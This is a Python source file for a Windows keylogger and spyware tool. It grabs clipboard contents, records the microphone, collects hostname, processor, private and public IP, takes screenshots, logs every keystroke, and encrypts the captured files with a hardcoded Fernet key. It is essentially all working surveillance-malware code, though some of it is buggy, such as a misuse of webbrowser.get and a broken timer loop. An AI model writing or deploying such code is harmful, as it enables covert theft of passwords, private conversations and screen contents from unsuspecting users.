#importing libraries

import pynput
import platform
import win32clipboard
import socket
from webbrowser import get
from scipy.io.wavfile import write
import sounddevice as sd
import time
import os

from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener
from PIL import ImageGrab

keys_information = "log.txt"
system_information = "syseminfo.txt"
clipboard_information = "clipboard.txt"
audio_information = "audiio.wav"
screenshot_information = "screenshot.png"

keys_information_e = "e_key_log.txt"
system_information_e = "e_systeminfo.txt"
clipboard_information_e = "e_clipboard.txt"

key = "lpLRwzyliHrshx9Ht8xXwtVEfvt1oMGHGFOZSLT9FfI="

microphone_time = 10
time_iteration = 15
number_of_iterations_end = 3

file_path = "C:\\Users\\hp\\PycharmProjects\\pythonProject\\project"
extend = "\\"
file_merge = file_path + extend

#copying clipboard
def copy_clipboard():
    with open(file_path + extend + clipboard_information, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("Clipboard Data: \n" + pasted_data)

        except:
            f.write("Clipboard could not be copied")
copy_clipboard()

#recording microphone
def microphone():
    fs = 44100
    seconds = microphone_time

    myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
    sd.wait()

    write(file_path + extend + audio_information, fs, myrecording)

microphone()

#getting computer information
def computer_information():
    with open(file_path + extend + system_information, "a") as f :
        hostname = socket.gethostname()
        IPAddr = socket.gethostbyname(hostname)
        try :
            public_ip = get("https://api.ipify.org").text
            f.write("Public IP Address: " + public_ip)

        except Exception:
            f.write("Couldn't get Public IP Address (most likely max proxy)" + "\n")
        f.write("Processor: " + (platform.processor()))
        f.write("System" + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + "\n")
        f.write("Hostname:" + hostname + "\n")
        f.write("Private IP Address: " + IPAddr + "\n")

computer_information()

#taking screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_information)

screenshot()

#timer for keylogger
number_of_iterations = 0
currentTime = time.time()
stopping_time = time.time() + time_iteration

count = 0
keys = []
def on_press(key):
    global keys, count, currentTime

    keys.append(key)
    count += 1
    print("{0} pressed".format(key))
    currentTime = time.time()

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []


def write_file(keys):
    with open("log.txt", "a") as f:
        for key in keys:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write('\n')
            elif k.find("Key") == -1:
                f.write(k)

#starting the keylogger
def on_release(key):
    if key == Key.esc:
        return False

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
if currentTime > stopping_time:
    with open(file_path + extend + keys_information, "w") as f:
        f.write(" ")

    screenshot()
    copy_clipboard()

    number_of_iterations +=1

    currentTime = time.time()
    stopping_time = time.time() + time_iteration
# Encrypting the files 
files_to_encrypt = [file_merge + system_information, file_merge + clipboard_information, file_merge + keys_information]
encrypted_file_names = [file_merge + system_information_e, file_merge + clipboard_information_e, file_merge + keys_information_e]

count = 0

for encrypting_file in files_to_encrypt:

    with open(files_to_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_file_names[count], 'wb') as f:
        f.write(encrypted)

    count +=1

